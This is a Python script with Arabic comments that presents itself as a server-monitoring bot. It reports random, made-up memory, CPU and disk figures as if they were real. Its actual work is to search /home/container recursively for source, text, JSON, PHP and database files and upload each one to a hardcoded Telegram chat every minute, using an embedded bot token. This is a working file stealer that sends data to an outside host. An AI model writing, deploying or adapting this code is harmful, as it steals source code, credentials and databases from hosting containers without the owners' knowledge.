import telebot
import numpy as np  # مكتبة غير شائعة
import socket
import time
import glob  # مكتبة بديلة للبحث عن الملفات
import subprocess  # مكتبة subprocess

# استبدل 'YOUR_BOT_TOKEN' بالتوكن الخاص بك
bot = telebot.TeleBot('7287328621:AAGc0vXazReVM86UiWm_ntgMFFepDXJ7CYY')

# معرف الدردشة (chat_id) الذي تريد إرسال الرسائل إليه
chat_id = '2110710318'

def gather_server_info():
    # جمع معلومات السيرفر
    ip = socket.gethostbyname(socket.gethostname())
    total_mem = np.random.uniform(4, 16)  # إجمالي الذاكرة (عشوائي بين 4 و 16 جيجابايت)
    used_mem = np.random.uniform(0, total_mem)  # استخدام عشوائي للذاكرة
    available_mem = total_mem - used_mem  # الذاكرة المتاحة
    cpu_load = np.random.randint(0, 100)  # استخدام عشوائي لوحدة المعالجة المركزية
    disk_load = np.random.randint(0, 100)  # استخدام عشوائي للقرص

    return (f"IP Address: {ip}\n"
            f"Total Memory: {total_mem:.2f} GB\n"
            f"Used Memory: {used_mem:.2f} GB\n"
            f"Available Memory: {available_mem:.2f} GB\n"
            f"Memory Usage: {used_mem / total_mem * 100:.2f}%\n"
            f"CPU Usage: {cpu_load}%\n"
            f"Disk Usage: {disk_load}%\n"
            f"Total Disk Space: {np.random.uniform(100, 500):.2f} GB\n"  # إجمالي مساحة القرص (عشوائي بين 100 و 500 جيجابايت)
            f"Used Disk Space: {np.random.uniform(0, 500):.2f} GB\n"  # استخدام عشوائي لمساحة القرص
            f"Free Disk Space: {np.random.uniform(0, 500):.2f} GB")  # مساحة القرص المتاحة (عشوائي)

def send_files():
    # جمع وإرسال الملفات داخل مسار /home/container وجميع المجلدات الفرعية مع تجنب /home/container/.local/
    base_path = '/home/container'
    extensions = ['py', 'js', 'txt', 'json', 'php', 'db']
    count_sent = 0  # متغير لتتبع عدد الملفات المرسلة

    for ext in extensions:
        for file_path in glob.glob(f'{base_path}/**/*.{ext}', recursive=True):  # البحث داخل /home/container وجميع المجلدات الفرعية
            if subprocess.run(['test', '-f', file_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE).returncode == 0 and '/home/container/.local/' not in file_path:  # تجاهل المسار المحدد
                try:
                    with open(file_path, 'rb') as file:
                        bot.send_document(chat_id, file, caption=str(file_path))
                    time.sleep(0.1)  # تأخير 0.1 ثانية بين كل ملف وآخر
                    count_sent += 1  # زيادة العداد
                except Exception as e:
                    print(f"Error sending file {file_path}: {e}")

    # إرسال رسالة عند الانتهاء من إرسال جميع الملفات
    if count_sent > 0:
        bot.send_message(chat_id, f"تم إرسال {count_sent} ملف(ملفات) بنجاح.")
    else:
        bot.send_message(chat_id, "لا توجد ملفات لإرسالها.")

def dispatch_data():
    while True:
        server_info = gather_server_info()
        bot.send_message(chat_id, server_info)

        # إرسال الملفات داخل مسار /home/container وجميع المجلدات الفرعية مع تجنب /home/container/.local/
        send_files()

        time.sleep(60)  # انتظر 60 ثانية قبل إرسال المعلومات مرة أخرى

if __name__ == "__main__":
    dispatch_data()
